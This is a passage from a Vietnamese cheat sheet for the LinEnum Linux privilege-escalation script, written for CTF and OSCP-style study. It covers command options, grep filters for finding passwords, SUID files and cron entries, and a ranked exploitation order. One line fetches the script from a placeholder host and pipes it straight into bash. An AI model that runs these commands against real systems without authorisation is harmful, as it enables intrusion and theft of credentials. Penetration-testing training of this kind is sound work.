║  -r <n> │ Đặt tên report tùy chỉnh          │ Dùng kèm -e            ║
║  -s     │ Nhập sudo password                │ Đã có password của user ║
║  -h     │ Help menu                         │ Xem nhanh syntax       ║
╠══════════════════════════════════════════════════════════════════════╣
║  LỆNH THỰC CHIẾN                                                     ║
╠══════════════════════════════════════════════════════════════════════╣
║  CTF nhanh   │ ./LinEnum.sh 2>/dev/null | tee /tmp/le.txt           ║
║  Tìm pass    │ ./LinEnum.sh -k password 2>/dev/null | tee /tmp/lp.txt ║
║  OSCP full   │ ./LinEnum.sh -t -k password -e /tmp/ 2>/dev/null     ║
║  Có password │ ./LinEnum.sh -t -s 2>/dev/null | tee /tmp/le.txt     ║
║  Background  │ ./LinEnum.sh -t 2>/dev/null > /tmp/le.txt &          ║
║  No file     │ curl -s http://<IP>/LinEnum.sh | bash 2>/dev/null    ║
╠══════════════════════════════════════════════════════════════════════╣
║  PHÂN TÍCH OUTPUT                                                    ║
╠══════════════════════════════════════════════════════════════════════╣
║  Quan trọng  │ grep "\[+\]" /tmp/le.txt                             ║
║  Sudo        │ grep -A 20 "Sudo" /tmp/le.txt                        ║
║  SUID        │ grep -A 50 "SUID files" /tmp/le.txt                  ║
║  Cron        │ grep -A 20 "cron" /tmp/le.txt                        ║
║  Writable    │ grep "\[+\].*writ" /tmp/le.txt                       ║
║  Password    │ grep -i "password" /tmp/le.txt | grep -v "^#"        ║
╠══════════════════════════════════════════════════════════════════════╣
║  THỨ TỰ KHAI THÁC (ưu tiên)                                         ║
║  1. sudo -l              4. Cron writable scripts                    ║
║  2. SUID/SGID → GTFOBins 5. Passwords in files                      ║
║  3. Capabilities         6. NFS / Docker / Container                 ║
╚══════════════════════════════════════════════════════════════════════╝
```

---

## Tài nguyên bổ sung

|Tài nguyên|URL|
|---|---|
|LinEnum GitHub|https://github.com/rebootuser/LinEnum|
|GTFOBins|https://gtfobins.github.io/|
|HackTricks Linux PrivEsc|https://book.hacktricks.xyz/linux-hardening/privilege-escalation|
|Linux Exploit Suggester|https://github.com/mzet-/linux-exploit-suggester|
|pspy (process monitor)|https://github.com/DominicBreuker/pspy|
|LinPEAS (bổ sung)|https://github.com/carlospolop/PEASS-ng|
|PEASS-ng Releases|https://github.com/carlospolop/PEASS-ng/releases/latest|

---

_Tài liệu này được tạo cho mục đích học tập và thi chứng chỉ bảo mật (CTF, CPTS, OSCP). Chỉ sử dụng trên hệ thống mà bạn có quyền kiểm tra._